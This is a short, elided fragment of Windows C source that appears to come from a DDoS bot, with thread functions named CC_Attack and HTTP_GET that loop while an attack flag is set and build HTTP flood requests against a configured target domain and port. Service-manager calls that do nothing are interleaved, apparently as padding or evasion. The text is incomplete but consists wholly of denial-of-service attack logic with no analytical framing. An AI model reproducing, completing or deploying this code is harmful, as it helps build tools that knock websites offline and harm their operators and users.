...
DWORD WINAPI CC_Attack(LPVOID lparam)
{
    ...
    while (Attacking)
    {
        for (a = pDDOS->CCAttack_First; a <= pDDOS->CCAttack_END; a++)
        {
            ...
            wsprintfA(tmp_head, pDDOS->GetPage, a);
            memset(Buffer, 0, sizeof(Buffer));
            SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
            wsprintfA(Buffer, CC_HEAD, tmp_head, pDDOS->Domain, pDDOS->Port, pDDOS->Domain);
            CloseServiceHandle(hSCM);
            nSize = lstrlenA(Buffer) + 1;
...
DWORD WINAPI HTTP_GET(LPVOID lparam)
{
    ...
    memset(Buffer, 0, sizeof(Buffer));
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    wsprintfA(Buffer, HTTP_HEAD, pDDOS->Domain, pDDOS->Port);
    CloseServiceHandle(hSCM);
    nSize = lstrlenA(Buffer) + 1;
    while (Attacking)
    {
